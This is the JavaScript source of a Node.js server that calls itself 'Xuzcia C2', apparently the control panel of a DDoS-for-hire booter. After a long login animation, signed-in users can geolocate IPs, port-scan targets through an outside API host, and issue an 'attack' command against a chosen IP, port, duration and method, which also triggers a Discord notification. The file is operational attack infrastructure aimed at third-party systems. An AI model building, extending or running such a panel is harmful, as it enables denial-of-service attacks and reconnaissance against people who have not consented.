const Net = require('net');
var requestIp = require('request-ip');
var fs = require('fs');
const request = require('request');
const axios = require('axios');
const p = require("phin");
const { exec } = require('child_process');
const port = +process.argv[2];
const server = new Net.Server();

const functions = require("./functions.js");
const config = require("./config.js");
const crud = require("./crud.js");
const banners = require("./animated_banners.js");
const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}
var SIDs = [];
var SessionID;

// console.log(crud.get_USER("Devious", "current"))
// console.log(functions.geo("73.73.73.73"));

server.listen(port, function() {
    console.log(config.RED + "Server started! => "  + port);
    resetSESSIONS(process.argv[2]);
    // var lport = socket.localPort;
    // var laddr = socket.localAddress;
    // console.log('Server is listening at LOCAL port: ' + lport);
    // console.log('Server LOCAL ip: ' + laddr.replace(":::ffff:", ""));
});

server.on('connection', function(socket) {
    // socket.write(functions.banner());
    set_title("Xuzcia's Official C2 | APIs Online: " + config.currentAPIs + " | Total Users: " + crud.getLineCOUNT("db/currentsession.sql") + " | Total Online Users: " + crud.getLineCOUNT("db/currentsession.sql") + " | Creator: Devious#9029", socket);
    socket.write(config.RED + "Welcome to Xuzcia C2\r\nLogin: \r\n" + config.BLACK);
    
    console.log(config.CYAN + '--------------------------------------------');
    console.log("A new connection has been established");
    var rport = socket.remotePort;
    var raddr = socket.remoteAddress;
    var rfamily = socket.remoteFamily;

    console.log('Client IP: ' + raddr.replace("::ffff:", "") + ":" + rport + ' | IP4/IP6: ' + rfamily);
    

    console.log('--------------------------------------------\r\n' + config.RED)

    // READING DATA
    socket.on('data', function(chunk) {
        //Cleaning data
        var cleanSTR = chunk.toString().replace(/(\r\n|\n|\r)/gm,"");

        //REFRESH TITLE's LINECOUNT
        set_title("Xuzcia's Official C2 | APIs Online: " + config.currentAPIs + " | Online Users: " + crud.getLineCOUNT("db/currentsession.sql") + " | Creator: Devious#9029 | Owner: draco#5013", socket);

        //HANDLING CMD
        //SPLIT ARGUMENT IF SPACE IS VALID
        if(cleanSTR.includes(" ") == true) { config.cmd_argv = cleanSTR.split(" "); }
        config.cmd = config.cmd_argv[0];
        var raddr = socket.remoteAddress.replace("::ffff:", "");
        // console.log("Signed in check: " + crud.isSignedin(raddr) + "\r\n")
        if(cleanSTR.startsWith("-u") == true)
        {
            functions.log("Logging_in | Signedin: " + crud.isSignedin(raddr), "Blank", raddr, "");
            if(cleanSTR.includes("-u") == true && cleanSTR.includes("-p") == true) {
                    var usrname = config.cmd_argv[0].replace("-u", "");
                    var pw = config.cmd_argv[1].replace("-p", "");
                    var raddr = socket.remoteAddress;
                    socket.write(config.clear); //CLEAR SCREEN
                var main = "";
                main += config.RED + "                     ┌┬─────────────────────────────┐\r\n"
                main +="                     ││                             │\r\n";
                main +="                     └┴─────────────────────────────┘\r\n";
                socket.write(main);
                sleep(500).then(() => {
                    main = "\033[2J\033[1;1H";
                    main +="                     ┌─┬────────────────────────────┐\r\n"
                    main +="                     │ │                            │\r\n";
                    main +="                     └─┴────────────────────────────┘\r\n";
                    socket.write(main);
                    sleep(500).then(() => {
                        main = "\033[2J\033[1;1H";
                        main +="                     ┌──┬───────────────────────────┐\r\n"
                        main +="                     │  │                           │\r\n";
                        main +="                     └──┴───────────────────────────┘\r\n";
                        socket.write(main);
                        sleep(500).then(() => {
                            main = "\033[2J\033[1;1H";
                            main +="                     ┌───┬──────────────────────────┐\r\n"
                            main +="                     │   │                          │\r\n";
                            main +="                     └───┴──────────────────────────┘\r\n";
                            socket.write(main);
                            sleep(500).then(() => {
                                main = "\033[2J\033[1;1H";
                                main +="                     ┌────┬─────────────────────────┐\r\n"
                                main +="                     │    │                         │\r\n";
                                main +="                     └────┴─────────────────────────┘\r\n";
                                socket.write(main);
                                sleep(500).then(() => {
                                    main = "\033[2J\033[1;1H";
                                    main +="                     ┌──────┬───────────────────────┐\r\n"
                                    main +="                     │      │                       │\r\n";
                                    main +="                     └──────┴───────────────────────┘\r\n";
                                    socket.write(main);
                                    sleep(500).then(() => {
                                        main = "\033[2J\033[1;1H";
                                        main +="                     ┌───────┬──────────────────────┐\r\n"
                                        main +="                     │       │                      │\r\n";
                                        main +="                     └───────┴──────────────────────┘\r\n";
                                        socket.write(main);
                                        sleep(500).then(() => {
                                            main = "\033[2J\033[1;1H";
                                            main +="                     ┌────────┬─────────────────────┐\r\n"
                                            main +="                     │        │                     │\r\n";
                                            main +="                     └────────┴─────────────────────┘\r\n";
                                            socket.write(main);
                                            sleep(500).then(() => {
                                                main = "\033[2J\033[1;1H";
                                                main +="                     ┌─────────┬────────────────────┐\r\n"
                                                main +="                     │         │                    │\r\n";
                                                main +="                     └─────────┴────────────────────┘\r\n";
                                                socket.write(main);
                                                sleep(500).then(() => {
                                                    main = "\033[2J\033[1;1H";
                                                    main +="                     ┌──────────┬───────────────────┐\r\n"
                                                    main +="                     │          │                   │\r\n";
                                                    main +="                     └──────────┴───────────────────┘\r\n";
                                                    socket.write(main);
                                                    sleep(500).then(() => {
                                                        main = "\033[2J\033[1;1H";
                                                        main +="                     ┌──────────┬───────────────────┐\r\n"
                                                        main +="                     │          │                   │\r\n";
                                                        main +="                     └──────────┴───────────────────┘\r\n";
                                                        socket.write(main);
                                                        sleep(500).then(() => {
                                                            main = "\033[2J\033[1;1H";
                                                            main +="                     ┌────────────┬─────────────────┐\r\n"
                                                            main +="                     │            │                 │\r\n";
                                                            main +="                     └────────────┴─────────────────┘\r\n";
                                                            socket.write(main);
                                                            sleep(500).then(() => {
                                                                main = "\033[2J\033[1;1H";
                                                                main +="                     ┌─────────────┬────────────────┐\r\n"; //ilulki
                                                                main +="                     │             │                │\r\n";
                                                                main +="                     └─────────────┴────────────────┘\r\n";
                                                                socket.write(main);
                                                                sleep(500).then(() => {
                                                                    main = "\033[2J\033[1;1H";
                                                                    main +="                     ┌──────────────┬───────────────┐\r\n"
                                                                    main +="                     │              │               │\r\n";
                                                                    main +="                     └──────────────┴───────────────┘\r\n";
                                                                    socket.write(main);
                                                                    sleep(500).then(() => {
                                                                        main = "\033[2J\033[1;1H";
                                                                        main +="                     ┌───────────────┬──────────────┐\r\n"
                                                                        main +="                     │               │              │\r\n";
                                                                        main +="                     └───────────────┴──────────────┘\r\n";
                                                                        socket.write(main);
                                                                        sleep(500).then(() => {
                                                                            main = "\033[2J\033[1;1H";
                                                                            main +="                     ┌───────────────┬──────────────┐\r\n"
                                                                            main +="                     │               │              │\r\n";
                                                                            main +="                     └───────────────┴──────────────┘\r\n";
                                                                            socket.write(main);
                                                                            sleep(500).then(() => {
                                                                                main = "\033[2J\033[1;1H";
                                                                                main +="                     ┌────────────────┬─────────────┐\r\n"
                                                                                main +="                     │                │             │\r\n";
                                                                                main +="                     └────────────────┴─────────────┘\r\n";
                                                                                socket.write(main);
                                                                                sleep(500).then(() => {
                                                                                    main = "\033[2J\033[1;1H";
                                                                                    main +="                     ┌─────────────────┬────────────┐\r\n"
                                                                                    main +="                     │                 │            │\r\n";
                                                                                    main +="                     └─────────────────┴────────────┘\r\n";
                                                                                    socket.write(main);
                                                                                    sleep(500).then(() => {
                                                                                        main = "\033[2J\033[1;1H";
                                                                                        main +="                     ┌──────────────────┬───────────┐\r\n"
                                                                                        main +="                     │                  │           │\r\n";
                                                                                        main +="                     └──────────────────┴───────────┘\r\n";
                                                                                        socket.write(main);
                                                                                        sleep(500).then(() => {
                                                                                            main = "\033[2J\033[1;1H";
                                                                                            main +="                     ┌───────────────────┬──────────┐\r\n" //yjyrtt
                                                                                            main +="                     │                   │          │\r\n";
                                                                                            main +="                     └───────────────────┴──────────┘\r\n";
                                                                                            socket.write(main);
                                                                                            sleep(500).then(() => {
                                                                                                main = "\033[2J\033[1;1H";
                                                                                                main +="                     ┌────────────────────┬─────────┐\r\n"
                                                                                                main +="                     │                    │         │\r\n";
                                                                                                main +="                     └────────────────────┴─────────┘\r\n";
                                                                                                socket.write(main);
                                                                                                sleep(500).then(() => {
                                                                                                    main = "\033[2J\033[1;1H";
                                                                                                    main +="                     ┌─────────────────────┬────────┐\r\n"
                                                                                                    main +="                     │                     │        │\r\n";
                                                                                                    main +="                     └─────────────────────┴────────┘\r\n";
                                                                                                    socket.write(main);
                                                                                                    sleep(500).then(() => {
                                                                                                        main = "\033[2J\033[1;1H";
                                                                                                        main +="                     ┌──────────────────────┬───────┐\r\n"
                                                                                                        main +="                     │                      │       │\r\n";
                                                                                                        main +="                     └──────────────────────┴───────┘\r\n";
                                                                                                        socket.write(main);
                                                                                                        sleep(500).then(() => {
                                                                                                            main = "\033[2J\033[1;1H";
                                                                                                            main +="                     ┌───────────────────────┬──────┐\r\n"
                                                                                                            main +="                     │                       │      │\r\n";
                                                                                                            main +="                     └───────────────────────┴──────┘\r\n";
                                                                                                            socket.write(main);
                                                                                                            sleep(500).then(() => {
                                                                                                                main = "\033[2J\033[1;1H";
                                                                                                                main +="                     ┌────────────────────────┬─────┐\r\n"
                                                                                                                main +="                     │                        │     │\r\n";
                                                                                                                main +="                     └────────────────────────┴─────┘\r\n";
                                                                                                                socket.write(main);
                                                                                                                sleep(500).then(() => {
                                                                                                                    main = "\033[2J\033[1;1H";
                                                                                                                    main +="                     ┌─────────────────────────┬────┐\r\n"
                                                                                                                    main +="                     │                         │    │\r\n";
                                                                                                                    main +="                     └─────────────────────────┴────┘\r\n";
                                                                                                                    socket.write(main);
                                                                                                                    sleep(500).then(() => {
                                                                                                                        main = "\033[2J\033[1;1H";
                                                                                                                        main +="                     ┌──────────────────────────┬───┐\r\n"
                                                                                                                        main +="                     │                          │   │\r\n";
                                                                                                                        main +="                     └──────────────────────────┴───┘\r\n";
                                                                                                                        socket.write(main);
                                                                                                                        sleep(500).then(() => {
                                                                                                                            main = "\033[2J\033[1;1H";
                                                                                                                            main +="                     ┌───────────────────────────┬──┐\r\n"
                                                                                                                            main +="                     │                           │  │\r\n";
                                                                                                                            main +="                     └───────────────────────────┴──┘\r\n";
                                                                                                                            socket.write(main);
                                                                                                                            sleep(500).then(() => {
                                                                                                                                main = "\033[2J\033[1;1H";
                                                                                                                                main +="                     ┌────────────────────────────┬─┐\r\n"
                                                                                                                                main +="                     │                            │ │\r\n";
                                                                                                                                main +="                     └────────────────────────────┴─┘\r\n";
                                                                                                                                socket.write(main);
                                                                                                                                sleep(500).then(() => {
                                                                                                                                    main = "\033[2J\033[1;1H";
                                                                                                                                    main +="                     ┌─────────────────────────────┬┐\r\n"
                                                                                                                                    main +="                     │                             ││\r\n";
                                                                                                                                    main +="                     └─────────────────────────────┴┘\r\n";
                                                                                                                                    socket.write(main);
                                                                                                                                    sleep(500).then(() => {
                                                                                                                                        socket.write(config.clear);
                                                                                                                                        socket.write(crud.login(usrname, pw, raddr.replace("::ffff:","")));
                                                                                                                                        socket.write(config.hostname);
                                                                                                                                    })
                                                                                                                                })
                                                                                                                            })
                                                                                                                        })
                                                                                                                    })
                                                                                                                })
                                                                                                            })
                                                                                                        })
                                                                                                    })
                                                                                                })
                                                                                            })
                                                                                        })
                                                                                    })
                                                                                })
                                                                            })
                                                                        })
                                                                    })
                                                                })
                                                            })
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })
                                })
                            })
                        })
                    })
                })
                } else {
                    socket.write(config.RED + "You must enter -u before the username and -p before the password!\r\n" + config.CYAN);
                    socket.write(config.hostname);
            }
        } else if(cleanSTR.startsWith("geo") && crud.isSignedin(raddr) === true) { //GEO COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Geo_Locating | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
                p(`http://devious.cf/jDa00EfYS1nr7/?action=geoip&q=${config.cmd_argv[1]}`).then(r => {
                    socket.write(`${r.body.toString()}\r\n`);
                }).catch(e => {
                    socket.write("Couldn't Geo Locate!\r\n");
                }) 
                socket.write(config.hostname); 
        } else if(cleanSTR.startsWith("pscan") && crud.isSignedin(raddr) === true) { //CLEAR COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Port_Scanning | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            // if(config.cmd_argv <= 1) {
                p(`http://devious.cf/jDa00EfYS1nr7/pscan.php?ip=${config.cmd_argv[1]}`).then(r => {
                    socket.write(`${r.body.toString()}\r\n`);
                    socket.write(config.hostname);
                }).catch(e => {
                    socket.write("Couldn't Geo Locate!\r\n");
                })
            // } else {
            //     socket.write("Enter a IP!\r\n");
            // }
        } else if(cleanSTR.startsWith("help") && crud.isSignedin(raddr) === true) { //HELP COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Help | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            socket.write(config.clear);
            socket.write(functions.help());
            socket.write(config.hostname);
        } else if(cleanSTR.startsWith("methods") && crud.isSignedin(raddr) === true) { //METHOD COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Methods | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            socket.write(config.clear);
            socket.write(functions.methods());
            socket.write(config.hostname);
        } else if(cleanSTR.startsWith("attack") && crud.isSignedin(raddr) === true) { //ATTACK COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Attacking | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            // if(config.cmd_argv[3] <= crud.get_maxTime(raddr)) {
                socket.write(functions.BOOT_ATTACK());
                // socket.write(functions.BOOT_ATTACK_API2());
                // socket.write(functions.jiepz_api());
                // socket.write(functions.atom_api());
                // socket.write(functions.kosha_api());
                functions.discord_nontification(username, config.cmd_argv[1], config.cmd_argv[2], config.cmd_argv[3], config.cmd_argv[4], raddr);
                socket.write("Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4] + "\r\n");
                socket.write(config.hostname);
            // } else {
            //     console.log(config.cmd_argv[3] + " is greater than " + crud.get_maxTime(raddr));
            //     socket.write("You tried to hit over your max time (" + crud.get_maxTime(raddr) + ")\r\nTry sending another attack with your max time or less!\r\n");
            //     socket.write(config.hostname);
            // }
        } else if(cleanSTR.startsWith("clear") && crud.isSignedin(raddr) === true) { //CLEAR COMMAND
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Clearing | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            socket.write(config.clear);
            socket.write(functions.banner());
            socket.write(config.hostname);
        } else if(crud.isSignedin(raddr) === true) {
            var username = crud.get_USER(raddr, "current").split("','")[0].replace("('", "");
            functions.log("Blank | Signedin: " + crud.isSignedin(raddr), username, raddr, cleanSTR);
            socket.write(config.clear);
            socket.write(functions.banner());
            socket.write(config.hostname);
        } else {
            functions.log("Incorrect info! | Signedin: " + crud.isSignedin(raddr), "Blank", raddr, cleanSTR);
            socket.write(config.RED + "You must enter -u before the username and -p before the password!\r\n" + config.BLACK);

        }
    });

    // WHEN A CLIENT DISCONNECTS
    socket.on('end', function() {
        var raddr = socket.remoteAddress.replace("::ffff:", "");
        console.log(config.CYAN + 'Closing connection with the client\r\n' + config.RED);
        crud.CLOSEsession(raddr);
    });

    // ANY ERRORS
    socket.on('error', function(err) {
        console.log(config.CYAN + "[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n" + config.RED);
    });
});

function set_title(string, socket)
{
    socket.write("\033]0;" + string + "\007")
}

function resetSESSIONS(port) {
    exec("rm -rf db/currentsesison.sql; touch db/currentsession.sql", function(data, err) {
        if(err) {
            console.log(err);
        }
    });
}